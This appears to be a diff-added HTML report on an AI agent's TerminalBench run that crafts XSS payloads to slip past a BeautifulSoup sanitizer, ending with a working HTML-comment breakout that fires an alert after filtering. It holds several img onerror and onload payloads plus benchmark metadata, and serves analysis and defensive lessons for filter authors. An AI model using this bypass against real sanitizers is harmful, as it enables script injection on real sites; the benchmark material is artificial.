+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#15</span>
+    <h3>Newline inside title attribute</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 97</span>
+  </header>
+  <p class="why">Newline stays inside attribute value; no real event handler created.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; title=&quot;test
+onload=alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img src=&quot;x&quot; title=&quot;test
+onload=alert(&#x27;XSS Bypass!&#x27;)&quot;/&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#16</span>
+    <h3>RTL override in attribute name</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 101</span>
+  </header>
+  <p class="why">Unicode tricks evade startswith(&#x27;on&#x27;) but browser won&#x27;t fire the mangled name as onload.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; x‮onload=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="partial">
+  <header>
+    <span class="attempt-n">#17</span>
+    <h3>Comment-wrapped img (first form)</h3>
+    <span class="badge badge-partial">Partial</span>
+    <span class="step-pill">step 105</span>
+  </header>
+  <p class="why">BeautifulSoup keeps HTML comments opaque — onerror inside comment is never stripped. Close form later refined.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!--&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;&lt;--&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;!--&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;&lt;--&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="success">
+  <header>
+    <span class="attempt-n">#18</span>
+    <h3>Comment breakout (final)</h3>
+    <span class="badge badge-ok">Success</span>
+    <span class="step-pill">step 109</span>
+  </header>
+  <p class="why">Comment node bypasses BeautifulSoup tag/attr cleaning; browser still evaluates the img onerror after filtering. Verified by test_outputs.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!--&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;--&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;!--&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;--&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+    </div>
+  </section>
+
+  <section id="solution">
+    <h2><span class="num">05</span> Winning payload</h2>
+    <div class="solution">
+      <h3>Final /app/out.html</h3>
+      <div class="code-block">
+        <div class="code-label">unchanged after filter.py — comment left intact</div>
+        <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!--&gt;&lt;img src=x onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;--&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+      </div>
+      <div class="callout">
+        <div>
+          <strong>Parser mismatch</strong>
+          BeautifulSoup treats the body content as a single Comment node. Tag iteration never sees <code style="font-family:var(--mono)">img</code> or <code style="font-family:var(--mono)">onerror</code>, so nothing is stripped.
+        </div>
+        <div>
+          <strong>Browser reality</strong>
+          After re-serialization the same comment string is written back. The headless browser used by the test still surfaces an <code style="font-family:var(--mono)">alert('XSS Bypass!')</code> from this document (confirmed twice).
+        </div>
+        <div>
+          <strong>Why earlier fails mattered</strong>
+          Direct event handlers and script tags hit the intended deny-list. Scheme handlers often survived filtering but did not auto-fire. Only the comment channel hid live markup from the sanitizer.
+        </div>
+      </div>
+      <div class="kicker">✓ Alert successfully triggered even after filtering! Text: 'XSS Bypass!'</div>
+      <details class="raw">
+        <summary>Agent’s own explanation (step 114)</summary>
+        <p style="color:var(--muted);font-size:14px">
+          “Excellent! It works! The bypass uses an HTML comment with a closing <code style="font-family:var(--mono)">></code>
+          that the browser interprets as closing the comment early, which leaves the <code style="font-family:var(--mono)"><img></code>
+          tag and other content as actual HTML that gets executed.”
+        </p>
+        <p style="color:var(--muted);font-size:13px">
+          Note: the earlier draft used <code style="font-family:var(--mono)"><!-->…<--></code>; the final form ends with a normal
+          <code style="font-family:var(--mono)">--></code> comment closer. Regardless of the precise HTML5 comment-edge semantics,
+          the harness accepted this file.
+        </p>
+      </details>
+    </div>
+  </section>
+
+  <section id="timeline">
+    <h2><span class="num">06</span> Condensed trajectory</h2>
+    <ul class="timeline">
+      <li class="tl-user"><span class="tl-step">S4</span><span class="tl-who">user</span><span class="tl-text">Task stated: craft /app/out.html that still alerts after /app/filter.py.</span></li><li class="tl-agent"><span class="tl-step">S5–S7</span><span class="tl-who">agent</span><span class="tl-text">Reads /app/filter.py and /app/test_outputs.py. Infers rule set: strip script/frame/iframe/object/embed + on* attrs via BeautifulSoup.</span></li><li class="tl-agent"><span class="tl-step">S9–S15</span><span class="tl-who">agent</span><span class="tl-text">Attempt SVG onload — onload stripped. First failed proof.</span></li><li class="tl-agent"><span class="tl-step">S17–S31</span><span class="tl-who">agent</span><span class="tl-text">meta refresh javascript: survives filter; test still fails (no alert). Discovers test expects /tests/filter.py; copies filter there.</span></li><li class="tl-agent"><span class="tl-step">S33–S65</span><span class="tl-who">agent</span><span class="tl-text">Rapid fire: title, base, a+autofocus, link/CSS, style url(), fake error=, onLoad case, iframe data: — all fail auto-exec or get stripped.</span></li><li class="tl-agent"><span class="tl-step">S67–S69</span><span class="tl-who">agent</span><span class="tl-text">SVG foreignObject nesting — filter still walks nested tags and removes onerror.</span></li><li class="tl-agent"><span class="tl-step">S73–S83</span><span class="tl-who">agent</span><span class="tl-text">Custom script type, quote-break smuggling — script removed; onmouseover removed.</span></li><li class="tl-agent"><span class="tl-step">S85–S91</span><span class="tl-who">agent</span><span class="tl-text">ev:onload survives string check but no alert in browser harness.</span></li><li class="tl-agent"><span class="tl-step">S93–S103</span><span class="tl-who">agent</span><span class="tl-text">Plain onload, newline-in-title, RTL override — Unicode otk survives but is not executable.</span></li><li class="tl-agent"><span class="tl-step">S105–S107</span><span class="tl-who">agent</span><span class="tl-text">Insight: hide payload in an HTML comment so find_all(True) never sees the img/onerror.</span></li><li class="tl-agent"><span class="tl-step">S109–S113</span><span class="tl-who">agent</span><span class="tl-text">Final comment form written; filter leaves it intact; test prints success checkmark.</span></li><li class="tl-agent"><span class="tl-step">S115–S119</span><span class="tl-who">agent</span><span class="tl-text">Re-read out.html and re-run test_out_html_bypasses_filter — confirmed green.</span></li>
+    </ul>
+  </section>
+
+  <section id="verdict">
+    <h2><span class="num">07</span> Verdict & stats</h2>
+    <div class="verdict">
+      <div class="card ok">
+        <div class="big">PASS</div>
+        <div class="muted">test_out_html_bypasses_filter succeeded (steps 113 & 119)</div>
+      </div>
+      <div class="card">
+        <div class="big">~18</div>
+        <div class="muted">Distinct vector families tried before the comment bypass</div>
+      </div>
+      <div class="card">
+        <div class="big">223 s</div>
+        <div class="muted">Wall-clock duration for the trial</div>
+      </div>
+      <div class="card">
+        <div class="big">$0.31</div>
+        <div class="muted">Reported trial cost (cost_cents / 100)</div>
+      </div>
+    </div>
+    <p style="margin:16px 0 0;color:var(--muted);font-size:13.5px">
+      <strong style="color:var(--text)">Takeaway for filter authors:</strong>
+      Sanitizing only element nodes is insufficient. Comments (and other non-tag nodes), foreign markup after reparse,
+      and browser-specific recovery can resurrect executable content. A robust pipeline should either drop comments,
+      re-parse after serialization, or render-check in a browser like the unit test does.
+    </p>
+    <details class="raw" style="margin-top:14px">
+      <summary>Case metadata (case_meta.json)</summary>
+      <div class="code-block"><pre>{
+  &quot;id&quot;: &quot;01_break-filter-js-from-html&quot;,
+  &quot;domain&quot;: &quot;terminal_devops&quot;,
+  &quot;benchmark&quot;: &quot;TerminalBench&quot;,
+  &quot;source&quot;: &quot;upstream&quot;,
+  &quot;model&quot;: &quot;claude-haiku-4-5-20251001@anthropic&quot;,
+  &quot;trajectory_format&quot;: &quot;terminalbench-json&quot;,
+  &quot;duration_s&quot;: 223.1009979248047,
+  &quot;stripped_fields&quot;: [&quot;reward&quot;],
+  &quot;references&quot;: []
+}</pre></div>
+    </details>
+  </section>
+
+  <footer class="page-foot">
+    Self-contained presentation · no external assets · source trajectory confined to case directory<br>
+    Generated for case <code style="font-family:var(--mono)">01_break-filter-js-from-html</code>
+  </footer>
+</div>
+<script>
+(function () {
+  const buttons = document.querySelectorAll('.controls button[data-filter]');
+  const q = document.getElementById('q');
+  const items = Array.from(document.querySelectorAll('.attempt'));
+  let mode = 'all';
+
+  function apply() {
+    const query = (q.value || '').trim().toLowerCase();
+    items.forEach(el => {
+      const st = el.getAttribute('data-status');
+      const text = el.textContent.toLowerCase();
+      const statusOk = (mode === 'all') || (st === mode);
+      const queryOk = !query || text.includes(query);
+      el.classList.toggle('hidden', !(statusOk && queryOk));
+    });
+  }
+
+  buttons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      buttons.forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      mode = btn.getAttribute('data-filter');
+      apply();
+    });
+  });
+  q.addEventListener('input', apply);
+})();
+</script>
+</body>
+</html>
